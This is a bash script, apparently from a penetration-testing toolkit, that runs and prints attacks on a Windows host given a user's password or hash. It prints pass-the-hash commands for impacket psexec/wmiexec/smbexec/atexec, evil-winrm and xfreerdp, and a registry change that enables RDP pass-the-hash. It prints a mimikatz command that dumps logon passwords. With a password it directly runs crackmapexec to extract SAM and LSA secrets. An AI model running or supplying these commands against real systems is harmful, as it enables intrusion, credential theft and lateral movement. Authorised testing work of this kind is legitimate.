#!/bin/bash

function show_help() {
    echo "Usage: $0 -i <IP/HOST> -u <USER> -p <PASSWORD>"
    echo ""
    echo "Options:"
    echo "  -i       The IP/HOST address of the target (required)"
    echo "  -u       User (required)"
    echo "  -p       Password (required if -H is not specified)"
    echo "  -H       User's hash (required if -p is not specified)"
    echo "  -h       Show this help message"
}

IP=""
USER=""
PASSWORD=""
USER_HASH=""

# Parse options
while getopts "i:u:p:H:h" opt; do
    case $opt in
        i) IP="$OPTARG" ;;
        u) USER="$OPTARG" ;;
        p) PASSWORD="$OPTARG" ;;
        H) USER_HASH="$OPTARG" ;;
        h) show_help; exit 0 ;;
        *) show_help; exit 1 ;;
    esac
done

if [[ -z "$IP" || -z "$USER" ]]; then
    show_help
    exit 1
fi

if [[ -z "$PASSWORD" && -z "$USER_HASH" ]]; then
  show_help
  exit 1
fi

OUTDIR="./results/${DOMAIN}"

if [[ ! -d "${OUTDIR}/logs" ]]; then
  mkdir -p "${OUTDIR}/logs"
fi

LOGFILE="${OUTDIR}/logs/enum-user-${USER}.log"
echo '' > $LOGFILE

source ./enum.conf

########################################################################################################################

# ======================================================================================================================
# Hash
if [[ -n "$USER_HASH" ]]; then

  tip "PtH attack"
  tip "- impacket-psexec $USER@$IP -hashes :$USER_HASH"
  tip "- impacket-wmiexec $USER@$IP -hashes :$USER_HASH"
  tip "- impacket-smbexec $USER@$IP -hashes :$USER_HASH"
  tip "- impacket-atexec $USER@$IP -hashes :$USER_HASH whoami"
  tip "- evil-winrm -i $IP -u $USER -H $USER_HASH"

  tip "RDP PtH"
  tip "- 'DisableRestrictedAdmin' flag in win register should be disabled for RDP PtH"
  tip "- reg add HKLM\System\CurrentControlSet\Control\Lsa /t REG_DWORD /v DisableRestrictedAdmin /d 0x0 /f"
  tip "- xfreerdp3 /v:$IP /u:$USER /pth:$USER_HASH"

  tip "inside win:"
  tip "- dump session:"
  tip '- mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" "exit" >> c:\tmp\mimikatz_output.txt'

  # impacket-psexec PtH
#  ask "[enum-user] run 'impacket-psexec $USER@$IP -hashes :$USER_HASH' ? (y/N)" choice
#  if [[ "$choice" == "y" || "$choice" == "Y" ]]; then
#    gmsg "> impacket-psexec $USER@$IP -hashes :$USER_HASH"
#    impacket-psexec $USER@$IP -hashes :$USER_HASH
#    separator
#  fi
#
#  ask "[enum-user] run 'impacket-wmiexec $USER@$IP -hashes :$USER_HASH' ? (y/N)" choice
#  if [[ "$choice" == "y" || "$choice" == "Y" ]]; then
#    gmsg "> impacket-wmiexec $USER@$IP -hashes :$USER_HASH"
#    impacket-wmiexec $USER@$IP -hashes :$USER_HASH
#    separator
#  fi

  # xfreerdp PtH
#  tip "DisableRestrictedAdmin flag should be disabled for RDP PtH; command:"
#  tip "- reg add HKLM\System\CurrentControlSet\Control\Lsa /t REG_DWORD /v DisableRestrictedAdmin /d 0x0 /f"
#  ask "[enum-user] run 'xfreerdp3 /v:$IP /u:$USER /pth:$USER_HASH' ? (y/N)"
#  if [[ "$choice" == "y" || "$choice" == "Y" ]]; then
#    gmsg "xfreerdp3 /v:$IP /u:$USER /pth:$USER_HASH"
#    xfreerdp3 /v:$IP /u:$USER /pth:$USER_HASH
#    separator
#  fi
fi

# ======================================================================================================================
# Password
# TODO crackmapexec all possible enums ?
if [[ -n "$PASSWORD" ]]; then
  gmsg "> crackmapexec smb $IP --local-auth -u $USER -p $PASSWORD --sam" $LOGFILE
  crackmapexec smb $IP --local-auth -u $USER -p $PASSWORD --sam | tee -a $LOGFILE
  separator $LOGFILE

  gmsg "> crackmapexec smb $IP --local-auth -u $USER -p $PASSWORD --lsa" $LOGFILE
  crackmapexec smb $IP --local-auth -u $USER -p $PASSWORD --lsa | tee -a $LOGFILE
  separator $LOGFILE
fi

# TODO password spray attack for user ?

# TODO enum services with creds ftp, smtp, ssh, ...


# TODO ./enum-ad.sh -> enum.sh